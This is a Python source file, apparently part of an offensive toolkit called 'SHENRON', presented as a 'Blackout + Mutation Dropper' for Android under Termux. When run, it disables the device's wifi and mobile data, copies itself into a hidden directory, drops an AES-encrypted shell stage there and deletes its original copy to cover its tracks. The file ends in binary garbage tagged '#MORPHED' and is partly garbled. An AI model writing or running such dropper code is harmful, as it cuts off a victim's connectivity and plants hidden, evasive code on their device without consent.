from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# deadzone_payload.py - SHENRON Layer 1: Blackout + Mutation Dropper

import os
import shutil
import subprocess
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

def blackout_interfaces():
    print("[*] Triggering local network blackout...")
    os.system("svc wifi disable")
    os.system("svc data disable")

def hide_self():
    hidden_path = "/data/data/com.termux/files/usr/var/.shenron"
    os.makedirs(hidden_path, exist_ok=True)
    target = os.path.join(hidden_path, "deadzone_payload.py")
    shutil.copy2(__file__, target)
    print(f"[*] Payload hidden at {target}")
    return target

def encrypt_payload(data, passphrase):
    salt = get_random_bytes(16)
    nonce = get_random_bytes(12)
    key = PBKDF2(passphrase.encode(), salt, dkLen=32, count=100000)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(salt + nonce + tag + ciphertext).decode()

def drop_mutated_payload():
    print("[*] Dropping mutated payload...")
    payload_code = '''
#!/bin/bash
echo "[*] Mutated SHENRON stage online..."
sleep 1
termux-open-url http://localhost:5555
'''
    encrypted = encrypt_payload(payload_code, "ShenronMasterKey")
    drop_path = "/data/data/com.termux/files/usr/var/.shenron/mutated_stage.sh.enc"
    with open(drop_path, "w") as f:
        f.write(encrypted)
    print(f"[âœ“] Mutated payload dropped (encrypted) at {drop_path}")

def self_delete():
    print("[*] Cleaning up original script...")
    try:
        os.remove(__file__)
    except Exception as e:
        print(f"[!] Self-delete failed: {e}")

if __name__ == "__main__":
    blackout_interfaces()
    hide_self()
    drop_mutated_payload()
    self_delete()

äì™ìñÒæªï¸—4Û²ˆa
|cÃÏ3ğ{0shö¦|ñ#MORPHED

°òÏÅu#yÂ‚m*Ã3:Ğ|]Gè¨ïÈ¡
Á%ò;ùÌ*%´mºrvBc¬ÚÆ#MORPHED

[ìC ÿLƒÛpu#MORPHED

®RáYÿ,P–<VŸq>b!û#MORPHED
